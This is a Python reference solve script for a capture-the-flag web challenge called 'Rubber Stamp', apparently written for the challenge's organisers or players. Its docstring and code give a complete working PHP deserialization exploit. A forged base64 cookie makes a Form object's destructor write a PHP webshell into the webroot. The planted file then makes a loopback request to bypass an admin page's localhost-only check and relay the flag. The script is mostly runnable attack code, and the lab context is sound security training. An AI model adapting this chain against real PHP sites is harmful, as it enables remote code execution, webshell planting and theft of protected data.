#!/usr/bin/env python3
"""
Reference solve for Rubber Stamp.

Chain:
  1. bootstrap.php (included by both the "My Forms" and "Submit a Form"
     routes) unserializes the `forms` cookie straight back into an array on
     every request - there's no database, so a terminal's whole form list
     just lives client-side. The only check is `is_array()` on the *outer*
     value; by the time that check runs, unserialize() has already fully
     built every object inside it, magic methods included.
  2. Form::__destruct() hands its `auditLog` property straight to
     ArchiveWriter::write() without checking where that writer points - and
     it builds the log line out of whatever's in `$this->fields`, an array
     whose shape varies per form type and is never validated.
  3. We supply our own ArchiveWriter whose `archivePath` is a .php file
     directly in the webroot (the leaked Dockerfile chowns the whole
     /var/www/html to www-data, so it's all writable - no special directory
     needed), and put our PHP payload as a value inside Form's `fields`
     array - any key works, since every value in that array gets
     string-interpolated into the log line.
  4. Just loading the page with the forged cookie fires the chain at script
     shutdown; then we just request the file we planted.
  5. admin.php holds the actual flag, but only answers requests whose
     REMOTE_ADDR is 127.0.0.1 - unreachable for us directly. Our planted
     file runs *inside* the container, though, so instead of echoing
     getenv('FLAG') itself, it makes its own loopback request to
     admin.php and relays the response back to us.

(EmailNotifier is a dead end: its __destruct() always writes to the
hardcoded, non-web-reachable /var/log/rubberstamp/mail.log - attacker control
over `recipient` doesn't help since the destination can't move.)

Both classes only have public properties, so this is plain PHP
serialization - no property-name mangling to worry about. The payload is
built with a small serializer below rather than a hand-typed string, so the
length prefixes can't drift out of sync with the content - see SOLUTION.md.

Usage: python3 solve.py http://<host>:<port>
"""
import base64
import re
import sys
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8081"
PAYLOAD_FILENAME = "pwn.php"
PHP_PAYLOAD = '<?php echo file_get_contents("http://127.0.0.1/admin.php"); ?>'


class Raw(str):
    """A pre-serialized PHP fragment, embedded as-is rather than re-wrapped as a string."""


def php_str(s: str) -> str:
    return f's:{len(s.encode())}:"{s}";'


def php_obj(class_name: str, **props) -> str:
    body = "".join(
        php_str(key) + (val if isinstance(val, Raw) else php_str(val))
        for key, val in props.items()
    )
    return f'O:{len(class_name)}:"{class_name}":{len(props)}:{{{body}}}'


def php_array(*raw_items: str) -> str:
    body = "".join(f'i:{i};{item}' for i, item in enumerate(raw_items))
    return f'a:{len(raw_items)}:{{{body}}}'


def build_cookie(webshell_path: str) -> str:
    archive_writer = php_obj("ArchiveWriter", archivePath=webshell_path)
    fields = php_array(php_str(PHP_PAYLOAD))
    form = php_obj(
        "Form",
        formId="x",
        formType="x",
        fields=Raw(fields),
        status="x",
        auditLog=Raw(archive_writer),
    )
    # The cookie holds the whole forms *list*, not a single entry.
    payload = php_array(form)
    return base64.b64encode(payload.encode()).decode()


def main():
    webshell_path = f"/var/www/html/{PAYLOAD_FILENAME}"
    cookie = build_cookie(webshell_path)

    # 4. Any request with the forged cookie fires Form::__destruct() at
    #    shutdown, planting pwn.php straight in the webroot.
    req = urllib.request.Request(BASE + "/", headers={"Cookie": f"forms={cookie}"})
    with urllib.request.urlopen(req, timeout=20) as resp:
        resp.read()

    with urllib.request.urlopen(f"{BASE}/{PAYLOAD_FILENAME}", timeout=20) as resp:
        body = resp.read().decode("utf-8", "replace")

    match = re.search(r"flag\{[^}]*\}", body)
    if not match:
        print("---- response body ----")
        print(body)
        sys.exit("FLAG not found in response - check the chain above")

    print(match.group(0))


if __name__ == "__main__":
    main()
